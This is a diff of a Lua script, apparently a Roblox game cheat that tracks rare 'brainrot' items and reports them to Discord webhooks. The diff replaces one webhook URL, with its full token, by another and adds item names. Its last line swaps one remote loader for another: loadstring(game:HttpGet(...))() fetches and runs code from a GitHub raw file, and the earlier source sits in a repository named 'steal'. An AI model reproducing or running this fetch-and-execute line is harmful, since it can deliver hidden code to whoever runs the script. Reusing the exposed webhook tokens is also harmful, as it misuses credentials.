@@ -46,7 +46,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo',
+        url = 'https://discord.com/api/webhooks/1449111713428275282/1CByDVDPiQUqD0r59w9DxtJ1F9CUpjbXzPrnA_kvtRvz2KIKpXMMBdTM2kYkYswTP45I',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -103,6 +103,8 @@ local SPECIAL_BRAINROTS = {
     ['Gingerat Gerat'] = 0,
     ['Reinito Sleighito'] = 0,
     ['Dragon Gingerini'] = 0,
+    ['Festive 67'] = 0,
+    ['Money Money Reindeer'] = 0,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -235,6 +237,9 @@ local OBJECTS = {
     ['Los 25'] = { emoji = '💀', important = true },
     ['25'] = { emoji = '💄', important = true },
     ['Dragon Gingerini'] = { emoji = '🐍', important = true },
+    ['Donkeyturbo Express'] = { emoji = '🍩', important = true },
+    ['Festive 67'] = { emoji = '6️⃣', important = true },
+    ['Money Money Reindeer'] = { emoji = '💶', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -698,4 +703,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hpwerdsf/steal/refs/heads/main/nenado"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRuner2.lua"))()
